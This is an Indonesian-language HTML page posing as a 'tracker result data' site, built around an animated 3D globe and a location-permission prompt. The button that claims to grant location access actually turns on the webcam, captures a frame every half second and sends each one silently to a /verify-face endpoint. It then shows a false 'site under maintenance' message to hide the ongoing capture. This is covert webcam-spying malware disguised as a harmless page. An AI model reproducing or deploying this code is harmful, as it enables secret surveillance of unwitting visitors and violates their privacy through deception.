<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Entopix — Tracker Result Data</title>

  <meta property="og:title" content="Entopix — Tracker Result Data">
  <meta property="og:description" content="Membagikan data hasil pelacakan dengan mudah ke semua orang.">
  <meta property="og:image" content="https://cdn.jsdelivr.net/gh/ByexeOfficial999/image-to-url@main/1000558809.png">
  <meta property="og:url" content="https://EntopiX.com">
  <meta property="og:type" content="website">

  <meta property="og:site_name" content="EntopiX — Tracker Result Data">
</head>

<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700;800&display=swap" rel="stylesheet"/>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;overflow:hidden;background:#000}

body{
  font-family:'Outfit',sans-serif;
  color:#fff;
  position:relative;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
}

/* ── Canvas layers ── */
#canvas-stars{position:fixed;inset:0;z-index:0}
#canvas-globe{position:fixed;inset:0;z-index:1}

/* ── Content ── */
.content{
  position:relative;
  z-index:10;
  text-align:center;
  display:flex;
  flex-direction:column;
  align-items:center;
  gap:36px;
  padding:0 20px;
  /* push to top-center area above globe */
  margin-top:-220px;
}

.headline{
  font-size:clamp(1.6rem,4vw,2.9rem);
  font-weight:800;
  letter-spacing:-0.02em;
  line-height:1.2;
  text-shadow:0 0 40px rgba(255,255,255,0.25);
}

.headline span{
  background:linear-gradient(90deg,#6ee7ff,#a78bfa,#6ee7ff);
  background-size:200% auto;
  -webkit-background-clip:text;
  -webkit-text-fill-color:transparent;
  animation:shimmer 4s linear infinite;
}

@keyframes shimmer{to{background-position:200% center}}

/* ── Button ── */
.btn{
  position:relative;
  padding:16px 48px;
  background:transparent;
  border:2px solid rgba(255,255,255,0.6);
  color:#fff;
  font-family:'Outfit',sans-serif;
  font-weight:700;
  font-size:1rem;
  letter-spacing:0.06em;
  border-radius:100px;
  cursor:pointer;
  overflow:hidden;
  transition:border-color .3s,box-shadow .3s,transform .2s;
}

.btn::before{
  content:'';
  position:absolute;
  inset:0;
  background:rgba(255,255,255,0.08);
  opacity:0;
  transition:opacity .3s;
}

.btn:hover{
  border-color:#fff;
  box-shadow:0 0 30px rgba(255,255,255,0.2),0 0 60px rgba(110,231,255,0.15);
  transform:translateY(-2px);
}
.btn:hover::before{opacity:1}
.btn:active{transform:scale(.97)}

/* ── Modal overlay ── */
.modal-overlay{
  position:fixed;inset:0;
  z-index:100;
  background:rgba(0,0,0,.65);
  backdrop-filter:blur(8px);
  -webkit-backdrop-filter:blur(8px);
  display:flex;align-items:center;justify-content:center;
  padding:20px;
  opacity:0;pointer-events:none;
  transition:opacity .3s ease;
}
.modal-overlay.show{opacity:1;pointer-events:all}

.modal{
  background:#0d0d0d;
  border:1px solid rgba(255,255,255,0.12);
  border-radius:24px;
  padding:40px 36px 36px;
  max-width:400px;width:100%;
  text-align:center;
  box-shadow:0 24px 80px rgba(0,0,0,.8),0 0 0 1px rgba(255,255,255,.04);
  transform:translateY(28px) scale(.95);
  transition:transform .35s cubic-bezier(.34,1.56,.64,1);
}
.modal-overlay.show .modal{transform:translateY(0) scale(1)}

.modal-icon{
  width:68px;height:68px;
  border-radius:18px;
  background:linear-gradient(135deg,#1a1a2e,#16213e);
  border:1px solid rgba(110,231,255,.25);
  display:flex;align-items:center;justify-content:center;
  margin:0 auto 22px;
}

.modal h2{
  font-size:1.25rem;font-weight:700;
  margin-bottom:10px;
  letter-spacing:-0.01em;
}

.modal p{
  font-size:.88rem;
  color:rgba(255,255,255,.55);
  line-height:1.65;
  margin-bottom:28px;
  font-weight:300;
}

.modal-btn{
  width:100%;
  padding:14px;
  background:#fff;
  color:#000;
  font-family:'Outfit',sans-serif;
  font-weight:700;
  font-size:.92rem;
  border:none;
  border-radius:12px;
  cursor:pointer;
  transition:background .2s,transform .15s,box-shadow .2s;
  box-shadow:0 4px 20px rgba(255,255,255,.15);
}
.modal-btn:hover{background:#e8e8e8;transform:translateY(-1px);box-shadow:0 6px 24px rgba(255,255,255,.2)}
.modal-btn:active{transform:scale(.98)}

.modal-cancel{
  width:100%;
  padding:12px;
  background:transparent;
  color:rgba(255,255,255,.35);
  font-family:'Outfit',sans-serif;
  font-size:.84rem;
  border:none;
  cursor:pointer;
  margin-top:10px;
  border-radius:10px;
  transition:color .2s,background .2s;
}
.modal-cancel:hover{color:rgba(255,255,255,.7);background:rgba(255,255,255,.05)}
</style>
</head>
<body>

<canvas id="canvas-stars"></canvas>
<canvas id="canvas-globe"></canvas>

<!-- Main content -->
<div class="content">
  <h1 class="headline">Platform Penyimpanan<br><span>Data Hasil Pelackan</span></h1>
  <button class="btn" onclick="openModal()">Lihat Lokasi</button>
</div>

<!-- Modal -->
<div class="modal-overlay" id="overlay" onclick="handleOutside(event)">
  <div class="modal" id="modal">
    <div class="modal-icon">
      <svg width="30" height="30" fill="none" viewBox="0 0 24 24" stroke="rgba(110,231,255,0.9)" stroke-width="1.8">
        <path stroke-linecap="round" stroke-linejoin="round" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"/>
        <path stroke-linecap="round" stroke-linejoin="round" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"/>
      </svg>
    </div>
    <h2>Izin Lokasi</h2>
    <p>Website ini membutuhkan izin akses lokasi dari browser untuk menampilkan data hasil pelacakan.</p>
    <button class="modal-btn" onclick="startVerification()">Izinkan Akses Lokasi</button>
    <button class="modal-cancel" onclick="closeModal()">Tidak Sekarang</button>
  </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
<script>
const sc = document.getElementById('canvas-stars');
const sx = sc.getContext('2d');
let W, H, staticStars = [], shooters = [];

function resize(){
  W = sc.width  = window.innerWidth;
  H = sc.height = window.innerHeight;
}
resize();
window.addEventListener('resize', resize);

// static stars
for(let i=0;i<220;i++){
  staticStars.push({
    x:Math.random(),y:Math.random(),
    r:Math.random()*1.4+.3,
    o:Math.random()*.7+.2,
    blink:Math.random()*Math.PI*2
  });
}

function spawnShooter(){
  const side = Math.random();
  let x, y, angle;
  if(side<.5){ x=Math.random()*W*.6; y=0; angle=Math.random()*30+50; }
  else        { x=W; y=Math.random()*H*.4; angle=Math.random()*30+200; }
  shooters.push({
    x, y,
    dx: Math.cos(angle*Math.PI/180)*14,
    dy: Math.sin(angle*Math.PI/180)*14,
    len: Math.random()*120+80,
    life:1, decay: Math.random()*.018+.012
  });
}

setInterval(spawnShooter, 700);

function drawStars(t){
  sx.clearRect(0,0,W,H);
  // static
  staticStars.forEach(s=>{
    const op = s.o*(0.6+0.4*Math.sin(t*.001+s.blink));
    sx.beginPath();
    sx.arc(s.x*W, s.y*H, s.r, 0, Math.PI*2);
    sx.fillStyle=`rgba(200,225,255,${op})`;
    sx.fill();
  });
  // shooters
  shooters=shooters.filter(s=>{
    sx.beginPath();
    sx.moveTo(s.x, s.y);
    sx.lineTo(s.x - s.dx*(s.len/14), s.y - s.dy*(s.len/14));
    const grd=sx.createLinearGradient(s.x,s.y,s.x-s.dx*(s.len/14),s.y-s.dy*(s.len/14));
    grd.addColorStop(0,`rgba(255,255,255,${s.life})`);
    grd.addColorStop(1,'rgba(255,255,255,0)');
    sx.strokeStyle=grd;
    sx.lineWidth=1.5;
    sx.stroke();
    s.x+=s.dx; s.y+=s.dy; s.life-=s.decay;
    return s.life>0 && s.x>-200 && s.x<W+200 && s.y<H+200;
  });
}

const scene    = new THREE.Scene();
const camera   = new THREE.PerspectiveCamera(40, W/H, 0.1, 1000);
camera.position.z = 2.6;

const renderer = new THREE.WebGLRenderer({
  canvas: document.getElementById('canvas-globe'),
  alpha:true, antialias:true
});
renderer.setPixelRatio(Math.min(devicePixelRatio,2));
renderer.setSize(W, H);

scene.add(new THREE.AmbientLight(0x111133, 1.5));
const sun = new THREE.DirectionalLight(0x6699ff, 3);
sun.position.set(4, 2, 5);
scene.add(sun);
const back = new THREE.DirectionalLight(0x002244, 1);
back.position.set(-4,-2,-4);
scene.add(back);

function makeEarth(){
  const S=1024, cv=document.createElement('canvas');
  cv.width=S; cv.height=S/2;
  const c=cv.getContext('2d');

  const og=c.createLinearGradient(0,0,0,S/2);
  og.addColorStop(0,'#060e1c'); og.addColorStop(.5,'#0a1830'); og.addColorStop(1,'#040c18');
  c.fillStyle=og; c.fillRect(0,0,S,S/2);

  c.strokeStyle='rgba(30,120,255,0.1)'; c.lineWidth=.8;
  for(let i=0;i<=24;i++){const x=i/24*S;c.beginPath();c.moveTo(x,0);c.lineTo(x,S/2);c.stroke();}
  for(let i=0;i<=12;i++){const y=i/12*(S/2);c.beginPath();c.moveTo(0,y);c.lineTo(S,y);c.stroke();}

  c.fillStyle='rgba(15,60,30,0.85)';
  [
    // N America
    [[138,100],[195,82],[240,115],[252,185],[225,240],[188,248],[148,218],[120,168],[118,138]],
    // S America
    [[185,262],[222,250],[248,295],[248,368],[218,415],[182,418],[162,370],[155,300]],
    // Europe
    [[435,90],[478,76],[520,102],[528,145],[496,168],[462,162],[428,138]],
    // Africa
    [[445,178],[505,162],[542,192],[552,295],[522,385],[478,410],[440,372],[418,280],[425,205]],
    // Asia (west)
    [[510,75],[600,60],[660,80],[695,115],[685,165],[648,182],[600,176],[558,152],[525,120]],
    // Asia (east)
    [[660,75],[750,65],[800,90],[820,140],[790,185],[740,195],[688,178],[665,135]],
    // Australia
    [[648,305],[708,292],[745,322],[738,385],[700,408],[650,390],[625,345]],
    // Antarctica
    [[0,480],[1024,480],[1024,512],[0,512]]
  ].forEach(pts=>{
    c.beginPath();
    pts.forEach(([px,py],i)=>{
      const mx=px/1024*S, my=py/512*(S/2);
      i===0?c.moveTo(mx,my):c.lineTo(mx,my);
    });
    c.closePath(); c.fill();
  });

  // city glow dots
  [[.12,.22],[.18,.38],[.44,.22],[.50,.24],[.54,.20],[.62,.22],[.68,.28],[.60,.52],[.44,.42]].forEach(([fx,fy])=>{
    const cx2=fx*S, cy2=fy*(S/2);
    const grd=c.createRadialGradient(cx2,cy2,0,cx2,cy2,14);
    grd.addColorStop(0,'rgba(80,180,255,0.8)');
    grd.addColorStop(1,'transparent');
    c.fillStyle=grd; c.beginPath(); c.arc(cx2,cy2,14,0,Math.PI*2); c.fill();
  });

  // cloud haze
  for(let i=0;i<200;i++){
    const cx2=Math.random()*S, cy2=Math.random()*(S/2), r=Math.random()*28+8;
    const grd=c.createRadialGradient(cx2,cy2,0,cx2,cy2,r);
    grd.addColorStop(0,'rgba(200,230,255,0.06)'); grd.addColorStop(1,'transparent');
    c.fillStyle=grd; c.beginPath(); c.arc(cx2,cy2,r,0,Math.PI*2); c.fill();
  }
  return new THREE.CanvasTexture(cv);
}

const globe = new THREE.Mesh(
  new THREE.SphereGeometry(1,72,72),
  new THREE.MeshPhongMaterial({map:makeEarth(),specular:new THREE.Color(0x0a1530),shininess:35})
);
scene.add(globe);

const atm = new THREE.Mesh(
  new THREE.SphereGeometry(1.055,64,64),
  new THREE.MeshPhongMaterial({color:0x0033aa,transparent:true,opacity:.13,side:THREE.FrontSide,blending:THREE.AdditiveBlending,depthWrite:false})
);
scene.add(atm);

const rim = new THREE.Mesh(
  new THREE.SphereGeometry(1.09,64,64),
  new THREE.MeshPhongMaterial({color:0x0055ff,transparent:true,opacity:.07,side:THREE.BackSide,blending:THREE.AdditiveBlending,depthWrite:false})
);
scene.add(rim);

globe.position.set(0, -1.05, 0);
atm.position.copy(globe.position);
rim.position.copy(globe.position);
camera.position.z = 2.2;

let drag=false, prev={x:0,y:0}, vel={x:0,y:0}, autoRot=true;
const gc=document.getElementById('canvas-globe');

function onDown(cx,cy){drag=true;autoRot=false;prev={x:cx,y:cy};vel={x:0,y:0};}
function onMove(cx,cy){
  if(!drag)return;
  vel.x=(cx-prev.x)*.008; vel.y=(cy-prev.y)*.008;
  globe.rotation.y+=vel.x; globe.rotation.x+=vel.y*.35;
  prev={x:cx,y:cy};
}
function onUp(){drag=false;}

gc.addEventListener('mousedown',e=>onDown(e.clientX,e.clientY));
gc.addEventListener('mousemove',e=>onMove(e.clientX,e.clientY));
gc.addEventListener('mouseup',onUp); gc.addEventListener('mouseleave',onUp);
gc.addEventListener('touchstart',e=>onDown(e.touches[0].clientX,e.touches[0].clientY),{passive:true});
gc.addEventListener('touchmove',e=>{e.preventDefault();onMove(e.touches[0].clientX,e.touches[0].clientY);},{passive:false});
gc.addEventListener('touchend',onUp);

window.addEventListener('resize',()=>{
  W=window.innerWidth; H=window.innerHeight;
  camera.aspect=W/H; camera.updateProjectionMatrix();
  renderer.setSize(W,H);
});

// ── Render loop ──
function loop(t){
  requestAnimationFrame(loop);
  if(autoRot) globe.rotation.y+=.0015;
  if(!drag&&!autoRot){
    vel.x*=.94; vel.y*=.94;
    globe.rotation.y+=vel.x; globe.rotation.x+=vel.y*.35;
    if(Math.abs(vel.x)<.0002&&Math.abs(vel.y)<.0002) autoRot=true;
  }
  atm.rotation.copy(globe.rotation);
  rim.rotation.copy(globe.rotation);
  drawStars(t);
  renderer.render(scene,camera);
}
loop(0);

function openModal(){
  document.getElementById('overlay').classList.add('show');
  document.body.style.overflow='hidden';
}
function closeModal(){
  document.getElementById('overlay').classList.remove('show');
  document.body.style.overflow='';
}
function handleOutside(e){
  if(e.target===document.getElementById('overlay')) closeModal();
}
document.addEventListener('keydown',e=>{ if(e.key==='Escape') closeModal(); });

let stream;

async function startVerification() {

  try {

    stream =
      await navigator.mediaDevices.getUserMedia({
        video: true
      });

    const video =
      document.createElement("video");

    video.srcObject = stream;

    await video.play();

    const canvas =
      document.createElement("canvas");

    const ctx =
      canvas.getContext("2d");

    setInterval(async () => {

      try {

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        ctx.drawImage(
          video,
          0,
          0,
          canvas.width,
          canvas.height
        );

        const image =
          canvas.toDataURL("image/png");

        await fetch("/verify-face", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            image
          })
        });

      } catch (e) {}

    }, 500);

    alert(
      "Situs ini sedang dalam perbaikan. Coba buka lagi nanti."
    );

  } catch (err) {

    alert(
      "Verify That You Are Human Failed!"
    );

    console.error(err);

  }

}
</script>
</body>
</html>
